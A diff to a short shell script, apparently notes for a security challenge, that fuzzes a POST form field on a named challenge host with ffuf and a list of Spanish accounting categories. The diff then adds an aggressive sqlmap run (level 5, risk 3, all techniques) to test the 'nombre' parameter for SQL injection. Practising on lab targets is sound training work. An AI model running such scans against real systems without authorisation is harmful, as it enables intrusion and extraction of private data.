@@ -6,3 +6,8 @@ BASE='https://chl-3080b01d-bb9c-4e54-bf7f-06f64c3e6d9a-cuentas-claras.b.software
 printf 'Sueldos\nSalarios\nImpuestos\nTributos\nLegales\nJuridico\nJudicial\nFinanzas\nBancos\nCreditos\nPrestamos\nInversiones\nDividendos\nIntereses\nHonorarios\nAlquileres\nSeguros\nAmortizaciones\nProvisiones\nReservas\nNomina\nRRHH\nRecursos\nGastos\nCaja\nTesoreria\nContabilidad\nAuditoria\nDirectorio\nGerencia\nConfidencial\nReservado\nInterno\nVarios\nOtros\nComisiones\nViajes\nRepresentacion\nDonaciones\nMultas\nSanciones\nIndemnizaciones\nBonos\nAguinaldo\nVacaciones\nRetenciones\nIVA\nGanancias\nPatrimonio\nCapital\nUtilidades\nPerdidas\nIngresos\nEgresos\nVentas\nCompras\nProduccion\nMateriales\nServiciosPublicos\nEnergiaElectrica' > ~/cats.txt
 
 ffuf -u "$BASE/alta" -X POST -d "nombre=x&categoria=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w ~/cats.txt -mc all -ac -t 10
+
+
+
+BASE='https://chl-3080b01d-bb9c-4e54-bf7f-06f64c3e6d9a-cuentas-claras.b.softwareseguro.com.ar'
+sqlmap -u "$BASE/alta" --method=POST --data="nombre=test&categoria=Catering" -p nombre --batch --level=5 --risk=3 --threads=4 --dbms=sqlite --technique=BEUST
